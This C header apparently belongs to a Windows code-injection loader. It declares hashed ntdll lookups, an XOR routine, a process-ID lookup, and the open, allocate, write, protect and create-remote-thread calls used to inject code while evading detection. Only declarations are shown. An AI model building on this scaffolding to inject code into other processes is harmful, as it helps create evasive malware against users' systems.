#pragma once

#include "Internal.h"
#include <string.h>
#undef UNICODE
#include <TlHelp32.h>

#define NTDLL					0XF7FBFE68
#define LDR_LOAD_DLL			0X386B6C
#define RTL_INIT_UNICODE		0XD7FFF865
#define NT_OPEN_PROCESS			0X7F9FA05A
#define NT_ALLOCATE_VM			0XD97FFED5
#define NT_PROTECT_VM			0X3FFE8078
#define RTL_CREATE_USER_THREAD	0XC0000063
#define NT_WRITE_VM				0X77
#define NT_CLOSE				0X9D9EFFCB

typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	PVOID Buffer,
	ULONG NumberOfBytesToWrite,
	PULONG NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *LdrLoadDll_t)(
	PWSTR DllPath,
	PULONG DllCharacteristics,
	PUNICODE_STRING DllName, 
	PVOID* DllHandle
);

typedef VOID     (NTAPI *RtlInitUnicodeString_t)(
	PUNICODE_STRING DestinationString, 
	__drv_aliasesMem PCWSTR SourceString
);

typedef NTSTATUS (NTAPI *NtOpenProcess_t)(
	PHANDLE ProcessHandle, 
	ACCESS_MASK AccessMask, 
	POBJECT_ATTRIBUTES ObjectAttributes, 
	PCLIENT_ID ClientId
);

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
	HANDLE ProcessHandle, 
	PVOID* BaseAddress, 
	ULONG ZeroBits, 
	PULONG RegionSize, 
	ULONG AllocationType, 
	ULONG Protect
);

typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
	HANDLE ProcessHandle, 
	PVOID* BaseAddress, 
	PULONG NumberOfBytesToProtect, 
	ULONG NewAccessProtection, 
	PULONG OldAccessProtection
);

typedef NTSTATUS (NTAPI *RtlCreateUserThread_t)(
	HANDLE ProcessHandle,
	PSECURITY_DESCRIPTOR SecurityDescriptor,
	BOOLEAN CreateSuspended,
	ULONG StackZeroBits,
	PULONG StackReserved,
	PULONG StackCommit,
	PVOID StartAddress,
	PVOID StartParameter,
	PHANDLE ThreadHandle,
	PCLIENT_ID ClientID
);

typedef NTSTATUS (NTAPI *NtClose_t)(
	IN HANDLE ObjectHandle
);

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

HMODULE GetModuleByHash(
	DWORD32 hash
);

HMODULE LoadModule(
	LPSTR module
);

FARPROC GetProcAddressByHash(
	HMODULE module,
	DWORD32 hash
);

PIMAGE_SECTION_HEADER GetSection(
	HMODULE hModule, 
	PCSTR sectionName
);

DWORD   GetPid(
	LPCSTR name
);

VOID    XOR(
	PBYTE data,
	DWORD data_len, 
	PBYTE key, 
	DWORD key_len
);

DWORD32 GetHash(
	PSTR str
);

PCHAR	ToLowerStringA(
	PCHAR Ptr
);

SIZE_T	CharStringToWCharString(
	PWCHAR Destination,
	PCHAR Source, 
	SIZE_T MaximumAllowed
);

SIZE_T	WCharStringToCharString(
	PCHAR Destination, 
	PWCHAR Source, 
	SIZE_T MaximumAllowed
);

